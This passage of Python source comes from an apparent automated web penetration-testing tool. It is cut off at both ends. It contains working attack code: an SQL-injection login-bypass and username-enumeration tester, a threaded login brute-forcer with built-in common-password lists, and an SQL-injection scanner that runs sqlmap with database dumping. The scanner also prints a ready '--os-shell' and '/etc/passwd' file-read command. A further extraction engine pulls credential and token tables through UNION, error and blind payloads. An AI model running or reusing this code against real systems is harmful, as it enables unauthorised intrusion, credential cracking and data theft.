        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test auth")

    def _submit(hostval, path, u, p):
        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
        if gs is None:
            return None
        form = _parse_login_form(gbody or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _logged_in(cur, base):
        if cur is None or base is None:
            return False
        st, body, sc, loc = cur
        _fs, fbody, fsc, _fl = base
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
            return True
        new = _names(sc) - _names(fsc)
        if new and not _CREDS_ERR_RE.search(body or "") and \
                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _sig(r):
        if r is None:
            return None
        st, body, _sc, _loc = r
        em = _CREDS_ERR_RE.search(body or "")
        return st, len(body or ""), (em.group(0).lower() if em else None)

    def _rnduser():
        return "nx" + "".join(random.choices(string.ascii_lowercase, k=8))

    targets = _gather_login_targets(ip, port, proto)[:_AUTHB_MAX_TARGETS]
    deadline = time.time() + _AUTHB_DEADLINE
    stopped_deadline = [False]
    forms_tested = [0]
    results = {}                                              # hostval -> [lines]
    lock = threading.Lock()

    def _test(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        gs, gbody, _sc, _l = _req(hostval, "GET", path)
        if gs is None or not _parse_login_form(gbody or "", path):
            return                                            # not a login form → skip
        with lock:
            forms_tested[0] += 1
        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=8))
        fbase = _submit(hostval, path, _rnduser(), wrongpw)   # failure baseline (invalid creds)
        found = []
        # A) SQLi auth bypass
        for u, p in _SQLI_BYPASS:
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            cur = _submit(hostval, path, u, p or "x")
            if _logged_in(cur, fbase):
                found.append(f"  ✗ BYPASS {path}  (payload: {u} / {p or 'x'})")
                break
        # B) DB error surfacing
        er = _submit(hostval, path, "admin'", "x")
        if er and er[1] and _SQL_ERROR_RE.search(er[1]):
            found.append(f"  ! SQLERROR {path}  (DB error reflected)")
        # C) username enumeration — invalids consistent, 'admin' differs
        inv1, inv2 = _sig(fbase), _sig(_submit(hostval, path, _rnduser(), wrongpw))
        adm = _sig(_submit(hostval, path, "admin", wrongpw))
        if inv1 and inv2 and adm and inv1[0] == inv2[0] and inv1[2] == inv2[2] and \
                abs(inv1[1] - inv2[1]) <= max(64, int(inv1[1] * 0.05)):
            why = None
            if adm[0] != inv1[0]:
                why = f"status {adm[0]} vs {inv1[0]}"
            elif adm[2] != inv1[2]:
                why = f"error '{adm[2]}' vs '{inv1[2]}'"
            elif abs(adm[1] - inv1[1]) > max(64, int(inv1[1] * 0.05)):
                why = f"length {adm[1]} vs ~{inv1[1]}"
            if why:
                found.append(f"  · ENUM {path}  ({why})")
        if found:
            with lock:
                results.setdefault(hostval, []).extend(found)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_AUTHB_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ auth bypass + user enumeration",
             f"login forms tested: {forms_tested[0]} · {reason}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += sorted(set(results[hostval]))
    else:
        lines.append("\nno auth bypass / injection / user enumeration found")
    return "\n".join(lines)


_BRUTE_USER_WORDLISTS = [
    ("seclists top-usernames", ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]),
    ("seclists names", ["/usr/share/seclists/Usernames/Names/names.txt"]),
]
_BRUTE_USER_BUILTIN = ["admin", "administrator", "root", "user", "test", "guest", "operator",
                       "manager", "support", "webadmin", "sysadmin", "tomcat", "oracle",
                       "postgres", "info", "demo", "staff", "service", "backup"]
_BRUTE_PASS_WORDLISTS = [
    ("seclists top-500",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt"]),
    ("seclists top-100",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"]),
    ("seclists probable-1575", ["/usr/share/seclists/Passwords/probable-v2-top-1575.txt"]),
    ("rockyou", ["/usr/share/wordlists/rockyou.txt"]),
]
_BRUTE_PASS_BUILTIN = [
    "password", "123456", "123456789", "12345678", "12345", "1234", "admin", "Password1",
    "P@ssw0rd", "password1", "welcome", "welcome1", "changeme", "letmein", "qwerty", "root",
    "toor", "abc123", "admin123", "password123", "iloveyou", "monkey", "dragon", "111111",
    "sunshine", "princess", "football", "secret", "master", "superman", "hello", "login",
    "passw0rd", "test", "guest", "default", "administrator", "qwerty123", "1q2w3e4r",
    "654321", "123321", "000000", "qazwsx", "trustno1", "1234567", "zaq12wsx", "pass",
]
_BRUTE_LOCKOUT_RE = re.compile(
    r"locked|too many|try again later|temporarily (?:disabled|blocked)|rate.?limit|"
    r"account.*(?:disabled|suspended|blocked)|exceeded|throttl", re.I)
_BRUTE_DEADLINE = 600
_BRUTE_THREADS = 4
_BRUTE_REQ_TIMEOUT = 5
_BRUTE_MAX_PASS = 200
_BRUTE_PER_USER_CAP = 100
_BRUTE_USER_ENUM_CAP = 40
_BRUTE_LOCKOUT_PROBE = 5
_BRUTE_MAX_TARGETS = 8


def _pick_wordlist(cascade: list, builtin_desc: str, builtin: list) -> tuple:
    """Generic first-available (multi-file merged) wordlist picker with a builtin fallback."""
    for label, paths in cascade:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return builtin_desc, list(builtin)


def _brute_enum_confirmed(ip: str, port: int, proto: str) -> set:
    """(hostval, path) login surfaces where step 13 confirmed username enumeration works."""
    s = set()
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "auth-bypass":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                me = re.search(r"ENUM (\S+)", ln)
                if me:
                    s.add((host, me.group(1)))
    return s


def _tool_login_brute(ip: str, port: int, proto: str) -> str:
    """HTTP step-14 tool: GATED login brute-force on Basic realms and HTML forms. Three gates
    run first: (1) build a user list — enumerated via step-13's oracle where confirmed, else a
    small unconfirmed shortlist; (2) a lockout probe (several wrong passwords) that ABORTS the
    brute for a target if the account locks / rate-limits; (3) only then a capped, low-rate
    password brute (per-user cap as a second guard). Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import base64
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), \
                resp.headers.get("Location"), (resp.headers.get("WWW-Authenticate", "") or "")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None, ""
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot brute")

    def _submit_form(hostval, path, u, p):
        g = _req(hostval, "GET", path)
        if g[0] is None:
            return None
        form = _parse_login_form(g[1] or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in g[2])
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _try_basic(hostval, path, u, p):
        tok = base64.b64encode(f"{u}:{p}".encode()).decode()
        return _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})

    def _attempt(authtype, hostval, path, u, p):
        return _try_basic(hostval, path, u, p) if authtype == "Basic" else _submit_form(hostval, path, u, p)

    def _names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _success(authtype, cur, base):
        if cur is None:
            return False
        st = cur[0]
        if authtype == "Basic":
            return st is not None and st != 401
        if base is None:
            return False
        _st, body, sc, loc, _w = cur
        fbody, fsc = base[1], base[2]
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
            return True
        new = _names(sc) - _names(fsc)
        if new and not _CREDS_ERR_RE.search(body or "") and \
                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _sig(r):
        if r is None:
            return None
        st, body = r[0], r[1]
        em = _CREDS_ERR_RE.search(body or "")
        return st, len(body or ""), (em.group(0).lower() if em else None)

    def _differs(a, b):
        if a[0] != b[0] or a[2] != b[2]:
            return True
        return abs(a[1] - b[1]) > max(64, int(b[1] * 0.05))

    def _rnduser():
        return "nx" + "".join(random.choices(string.ascii_lowercase, k=9))

    _ulabel, user_wl = _pick_wordlist(_BRUTE_USER_WORDLISTS, f"builtin ({len(_BRUTE_USER_BUILTIN)})",
                                      _BRUTE_USER_BUILTIN)
    plabel, pass_wl = _pick_wordlist(_BRUTE_PASS_WORDLISTS, f"builtin ({len(_BRUTE_PASS_BUILTIN)})",
                                     _BRUTE_PASS_BUILTIN)
    pass_wl = pass_wl[:_BRUTE_MAX_PASS]
    enum_ok = _brute_enum_confirmed(ip, port, proto)
    targets = _gather_login_targets(ip, port, proto)[:_BRUTE_MAX_TARGETS]

    deadline = time.time() + _BRUTE_DEADLINE
    stopped_deadline = [False]
    attempts = [0]
    a_lock = threading.Lock()
    results = {}
    r_lock = threading.Lock()

    def _bump(n=1):
        with a_lock:
            attempts[0] += n

    def _handle(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        g = _req(hostval, "GET", path)
        if g[0] is None:
            return
        if g[0] == 401 and "basic" in g[4].lower():
            authtype = "Basic"
        elif g[0] == 200 and _parse_login_form(g[1] or "", path):
            authtype = "form"
        else:
            return
        out = []

        # failure baseline (for form success detection) + invalid enum signature
        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=9))
        fbase = _attempt(authtype, hostval, path, _rnduser(), wrongpw)
        _bump()

        # ── gate 1: user list ──────────────────────────────────────────────
        users, ulabel = [], "unconfirmed shortlist"
        if authtype == "form" and (hostval, path) in enum_ok:
            inv_sig = _sig(fbase)
            for cand in user_wl[:_BRUTE_USER_ENUM_CAP]:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    break
                s = _sig(_attempt(authtype, hostval, path, cand, wrongpw))
                _bump()
                if s and inv_sig and _differs(s, inv_sig):
                    users.append(cand)
                if len(users) >= 10:
                    break
            if users:
                ulabel = "enum-confirmed"
        if not users:
            users = ["admin", "administrator", "root", "user"]
        out.append(f"  users ({ulabel}): {', '.join(users)}")

        # ── gate 2: lockout probe ──────────────────────────────────────────
        probe_user = users[0]
        locked = False
        for _ in range(_BRUTE_LOCKOUT_PROBE):
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            r = _attempt(authtype, hostval, path, probe_user,
                         "wx" + "".join(random.choices(string.ascii_letters, k=8)))
            _bump()
            if r and (r[0] == 429 or _BRUTE_LOCKOUT_RE.search(r[1] or "")):
                locked = True
                break
        if locked:
            out.append(f"  ⚠ LOCKOUT {path} — brute skipped (gate)")
            with r_lock:
                results.setdefault(hostval, []).extend(out)
            return

        # ── gate 3: capped, low-rate password brute ────────────────────────
        for u in users:
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            cracked = None
            for i, pw in enumerate(pass_wl):
                if i >= _BRUTE_PER_USER_CAP or time.time() >= deadline:
                    if time.time() >= deadline:
                        stopped_deadline[0] = True
                    break
                cur = _attempt(authtype, hostval, path, u, pw)
                _bump()
                if cur and cur[0] == 429:        # rate-limited mid-brute → stop this user
                    break
                if _success(authtype, cur, fbase):
                    cracked = pw
                    break
            if cracked is not None:
                out.append(f"  ✗ CRACKED {u}:{cracked or '<blank>'} @ {path} ({authtype})")
        with r_lock:
            results.setdefault(hostval, []).extend(out)

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _handle(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_BRUTE_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ targeted login brute-force",
             f"password list: {plabel} (capped {len(pass_wl)}) · attempts {attempts[0]} · {reason}"]
    if results:
        for hostval in sorted(results):
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += results[hostval]
    else:
        lines.append("\nno login surfaces to brute")
    if not any("CRACKED" in ln for grp in results.values() for ln in grp):
        lines.append("\n(no credentials brute-forced)")
    return "\n".join(lines)


# non-destructive SQLi detection payloads (SELECT/AND/SLEEP only — never DROP/DELETE/UPDATE)
_SQLI_ERR_PAYLOADS = ["'", "\"", "')", "\\"]
_SQLI_DBMS_SIG = [
    ("mysql", r"you have an error in your sql syntax|warning:\s*mysqli?_|MySQL server version|valid MySQL"),
    ("postgresql", r"PostgreSQL.*?ERROR|pg_query|unterminated quoted string"),
    ("mssql", r"SQL Server|System\.Data\.SqlClient|unclosed quotation mark|ODBC SQL Server"),
    ("oracle", r"ORA-\d{5}|quoted string not properly terminated"),
    ("sqlite", r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|syntax error"),
]
_SQLI_BOOL = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1-- -", " AND 1=2-- -"),
]
_SQLI_TIME = [   # (dbms, sleep-5 template, control template)
    ("mysql", "' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
    ("mysql", '" AND SLEEP({n})-- -', '" AND SLEEP(0)-- -'),
    ("mysql", " AND SLEEP({n})", " AND SLEEP(0)"),
    ("postgresql", "' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -", "' AND 0=(SELECT 0)-- -"),
    ("mssql", "'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
]
_SQLI_DEADLINE = 300
_SQLI_THREADS = 6
_SQLI_REQ_TIMEOUT = 10
_SQLI_TIME_DELAY = 5
_SQLI_MAX_PARAMS = 30
_SQLI_MAX_TIME_PARAMS = 12
_SQLI_MAX_SQLMAP = 3
_SQLI_SQLMAP_TIMEOUT = 180


def _gather_sqli_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) to test — the params step 11 confirmed, else common params on
    dynamic endpoints mined earlier."""
    tg, seen = [], set()

    def _add(host, path, param):
        if (host, path, param) not in seen:
            seen.add((host, path, param))
            tg.append((host, path, param))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "param-hunt":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mm = re.match(r"\s+(\S+?)\?\[([^\]]+)\]", ln)
                if mm:
                    for p in mm.group(2).split(","):
                        if p.strip():
                            _add(host, mm.group(1), p.strip())
    if not tg:
        for host, path in _gather_param_endpoints(ip, port, proto):
            for p in ("id", "page", "cat", "file", "q", "user", "item", "pid", "view"):
                _add(host, path, p)
    return tg[:_SQLI_MAX_PARAMS]


def _tool_sqli_scan(ip: str, port: int, proto: str) -> str:
    """HTTP step-15 tool: detect SQLi on discovered params (error / boolean-blind / time-blind,
    stdlib, non-destructive) and then run sqlmap --batch on the confirmed points for enumeration
    + a BOUNDED dump (current DB, capped rows). os-shell / file-read are NOT auto — a ready
    command is printed instead. Stdlib detection; a dead server raises."""
    import http.client
    import ssl
    import time
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        t0 = time.perf_counter()
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536).decode("utf-8", "replace")
            return resp.status, body, time.perf_counter() - t0
        except Exception:                                     # noqa: BLE001
            return None, None, time.perf_counter() - t0
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/", "x", "1")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SQLi")

    targets = _gather_sqli_targets(ip, port, proto)
    deadline = time.time() + _SQLI_DEADLINE
    stopped = [False]
    confirmed = []            # (host, path, param, [techniques], dbms|None)
    time_candidates = []
    lock = threading.Lock()

    def _detect_fast(host, path, param):
        if time.time() >= deadline:
            stopped[0] = True
            return
        b_st, b_body, _ = _probe(host, path, param, "1")
        if b_st is None:
            return
        b_len = len(b_body or "")
        techs, dbms = [], None
        # error-based
        for pl in _SQLI_ERR_PAYLOADS:
            st, body, _ = _probe(host, path, param, "1" + pl)
            if body and _SQL_ERROR_RE.search(body):
                techs.append("error")
                for nm, rx in _SQLI_DBMS_SIG:
                    if re.search(rx, body, re.I):
                        dbms = nm
                        break
                break
        # boolean-blind
        for tpl, fpl in _SQLI_BOOL:
            rt = _probe(host, path, param, "1" + tpl)
            rf = _probe(host, path, param, "1" + fpl)
            if rt[0] and rf[0] and not _SQL_ERROR_RE.search(rt[1] or "") and \
                    not _SQL_ERROR_RE.search(rf[1] or ""):
                lt, lf = len(rt[1] or ""), len(rf[1] or "")
                if abs(lt - b_len) <= max(48, int(b_len * 0.02)) and \
                        abs(lt - lf) > max(80, int(lt * 0.05)):
                    techs.append("boolean")
                    break
        if techs:
            with lock:
                confirmed.append([host, path, param, techs, dbms])
        else:
            with lock:
                time_candidates.append((host, path, param))

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                host, path, param = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _detect_fast(host, path, param)
            finally:
                q.task_done()

    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SQLI_THREADS)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    # time-based: sequential (timing-sensitive), capped, only on not-yet-confirmed params
    for host, path, param in time_candidates[:_SQLI_MAX_TIME_PARAMS]:
        if time.time() >= deadline:
            stopped[0] = True
            break
        lat = min(_probe(host, path, param, "1")[2], _probe(host, path, param, "1")[2])
        for nm, ttpl, ctpl in _SQLI_TIME:
            _s, _b, c_el = _probe(host, path, param, "1" + ctpl)
            _s, _b, t_el = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
            if t_el >= _SQLI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _SQLI_TIME_DELAY * 0.6:
                _s, _b, t2 = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
                if t2 >= _SQLI_TIME_DELAY * 0.7:
                    confirmed.append([host, path, param, ["time"], nm])
                    break

    # sqlmap: enumerate + bounded dump on the confirmed points (capped)
    exe = shutil.which("sqlmap")
    sqlmap_out = {}
    for pt in confirmed[:_SQLI_MAX_SQLMAP]:
        host, path, param, _techs, dbms = pt
        url = f"{scheme}://{ip}:{port}{path}?{param}=1"
        if not exe:
            continue
        cmd = [exe, "-u", url, "-p", param, "--batch", "--level", "3", "--risk", "2",
               "--banner", "--current-user", "--current-db", "--dbs", "--tables", "--dump",
               "--start", "1", "--stop", "20", "--time-sec", str(_SQLI_TIME_DELAY),
               "--threads", "4", "--flush-session", "--disable-coloring"]
        if dbms:
            cmd += ["--dbms", dbms]
        if host != ip:
            cmd += ["--headers", f"Host: {host}"]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=_SQLI_SQLMAP_TIMEOUT)
            sqlmap_out[(host, path, param)] = proc.stdout or proc.stderr or ""
        except subprocess.TimeoutExpired:
            sqlmap_out[(host, path, param)] = "__timeout__"

    def _sqlmap_summary(out):
        if out == "__timeout__":
            return ["sqlmap: timed out (partial)"]
        if not out:
            return []
        s = []
        for label, rx in (("dbms", r"back-end DBMS:\s*(.+)"),
                          ("user", r"current user:\s*'([^']+)'"),
                          ("db", r"current database:\s*'([^']+)'")):
            m = re.search(rx, out)
            if m:
                s.append(f"{label}: {m.group(1).strip()}")
        mdb = re.search(r"available databases \[\d+\]:\n((?:\s*\[\*\] \S+\n?)+)", out)
        if mdb:
            dbs = re.findall(r"\[\*\] (\S+)", mdb.group(1))
            s.append(f"dbs: {', '.join(dbs[:8])}")
        if re.search(r"\[INFO\] table '.*?' dumped|Database:.*?\n\s*Table:", out) or \
                re.search(r"^\|.*\|$", out, re.M):
            s.append("dumped: yes")
        return s

    lines = [f"{scheme}://{ip}:{port}/ SQLi scan (stdlib detect + sqlmap)",
             f"params tested: {len(targets)} · injectable {len(confirmed)} · "
             f"sqlmap: {'ran' if exe else 'NOT INSTALLED — commands below'} · "
             f"{'deadline' if stopped[0] else 'complete'}"]
    if confirmed:
        by_host = {}
        for host, path, param, techs, dbms in confirmed:
            by_host.setdefault(host, []).append((path, param, techs, dbms))
        for host in sorted(by_host):
            lines.append(f"\n[{host}{' [default]' if host == ip else ''}]")
            for path, param, techs, dbms in by_host[host]:
                tag = ", ".join(techs) + (f"; {dbms}" if dbms else "")
                lines.append(f"  ✗ SQLI {path}?{param}  ({tag})")
                for s in _sqlmap_summary(sqlmap_out.get((host, path, param), "")):
                    lines.append(f"      {s}")
                url = f"{scheme}://{ip}:{port}{path}?{param}=1"
                hh = f" --headers='Host: {host}'" if host != ip else ""
                lines.append(f"      RCE/file (manual): sqlmap -u '{url}'{hh} -p {param} "
                             f"--batch --os-shell   # or --file-read=/etc/passwd")
    else:
        lines.append("\nno SQL injection found")
    return "\n".join(lines)


# OSCP-safe SQLi engine (no sqlmap / no external tool): breakout contexts, MySQL-first.
_SQLI_CTX = [("num", "1 "), ("sq", "1' "), ("dq", '1" '), ("sqp", "1') "), ("dqp", '1") ')]
_SQLI_DUMP_ERR = re.compile(
    r"SQL syntax|Unknown column|mysql_|valid MySQL|ORA-\d{5}|PostgreSQL|SQL Server|"
    r"sqlite|Warning|error in your|supplied argument|Query failed", re.I)
_SQLI_INTERESTING_TBL = re.compile(
    r"user|admin|account|member|login|credential|pass|auth|customer|staff|employee|flag|"
    r"secret|config|setting|session|token|key|private|cred", re.I)
_SQLI_INTERESTING_COL = re.compile(
    r"user|name|email|login|pass|pwd|hash|secret|token|key|role|admin|flag", re.I)
_SQLI_DUMP_MAX_TARGETS = 8
_SQLI_DUMP_MAX_COLS = 12
_SQLI_DUMP_ROWS = 15
_SQLI_DUMP_TABLES = 6
_SQLI_DUMP_DEADLINE = 300
_SQLI_DUMP_BLIND_MAXLEN = 64


def _tool_sqli_dump(ip: str, port: int, proto: str) -> str:
    """HTTP step tool (OSCP-safe, NO sqlmap / no external tool): a stdlib SQLi extraction
    engine. Finds the injection context, then extracts real data — UNION-based (fast: version,
    user, db, tables, columns, bounded row dump), error-based (extractvalue windows) or, for
    short scalars only, boolean-blind (binary search). MySQL-first. Non-destructive; dead → raises."""
    import http.client
    import ssl
    import time
    import urllib.parse
    import random
    import string

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()
    deadline = time.time() + _SQLI_DUMP_DEADLINE

    def _hx(s):
        return "0x" + s.encode().hex()

    def _get(hostval, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=10, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=10)
            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _engine(hostval, path, param):
        def g(v):
            return _get(hostval, path, param, v)

        base_st, base_body = g("1")
        if base_st is None:
            return None
        base_len = len(base_body or "")

        def broken(body, st):
            return (st is not None and st >= 500) or bool(_SQLI_DUMP_ERR.search(body or "")) or \
                abs(len(body or "") - base_len) > max(200, int(base_len * 0.5))

        # ── try UNION primitive across contexts ────────────────────────────
        mark = "".join(random.choices(string.ascii_lowercase, k=6))
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            r1 = g(pre + "ORDER BY 1-- -")
            if r1[0] is None or broken(r1[1], r1[0]):
                continue
            cols = 1
            for n in range(2, _SQLI_DUMP_MAX_COLS + 1):
                rn = g(pre + f"ORDER BY {n}-- -")
                if broken(rn[1], rn[0]):
                    break
                cols = n
            slots = [_hx(f"{mark}{j}{mark}") for j in range(cols)]
            ru = g(pre + "UNION SELECT " + ",".join(slots) + "-- -")
            refl = None
            for j in range(cols):
                if f"{mark}{j}{mark}" in (ru[1] or ""):
                    refl = j
                    break
            if refl is None:
                continue

            def ux(expr):
                sl = ["NULL"] * cols
                sl[refl] = f"concat({_hx(mark)},({expr}),{_hx(mark)})"
                r = g(pre + "UNION SELECT " + ",".join(sl) + "-- -")
                m = re.search(re.escape(mark) + r"(.*?)" + re.escape(mark), r[1] or "", re.S)
                return m.group(1) if m else None

            return _harvest("UNION", cname, cols, refl, ux)

        # ── error-based primitive (MySQL extractvalue) ─────────────────────
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            probe = g(pre + "AND extractvalue(1,concat(0x7e,0x6b716b))-- -")
            if probe[0] and re.search(r"XPATH syntax error: '~?kqk", probe[1] or ""):
                def ex(expr):
                    out, off = "", 1
                    while off < 512 and time.time() < deadline:
                        r = g(pre + f"AND extractvalue(1,concat(0x7e,mid(({expr}),{off},31)))-- -")
                        m = re.search(r"XPATH syntax error: '~(.*?)'", r[1] or "")
                        chunk = m.group(1) if m else ""
                        if not chunk:
                            break
                        out += chunk
                        if len(chunk) < 31:
                            break
                        off += 31
                    return out or None
                return _harvest("error", cname, None, None, ex)

        # ── boolean-blind primitive (scalars only) ─────────────────────────
        for cname, pre in _SQLI_CTX:
            if time.time() >= deadline:
                return None
            tr = g(pre + "AND 1=1-- -")
            fa = g(pre + "AND 1=2-- -")
            if not (tr[0] and fa[0]):
                continue
            lt, lf = len(tr[1] or ""), len(fa[1] or "")
            if abs(lt - base_len) <= max(48, int(base_len * 0.02)) and abs(lt - lf) > max(64, int(lt * 0.05)):
                def is_true(cond):
                    r = g(pre + f"AND ({cond})-- -")
                    return r[0] is not None and abs(len(r[1] or "") - lt) <= max(48, int(lt * 0.02))

                def bx(expr, maxlen=_SQLI_DUMP_BLIND_MAXLEN):
                    L = 0
                    for n in range(1, maxlen + 1):
                        if time.time() >= deadline:
                            break
                        if is_true(f"length(({expr}))>={n}"):
                            L = n
                        else:
                            break
                    s = ""
                    for i in range(1, L + 1):
                        if time.time() >= deadline:
                            break
                        lo, hi = 32, 126
                        while lo < hi:
                            md = (lo + hi) // 2
                            if is_true(f"ascii(substring(({expr}),{i},1))>{md}"):
                                lo = md + 1
                            else:
                                hi = md
                        s += chr(lo)
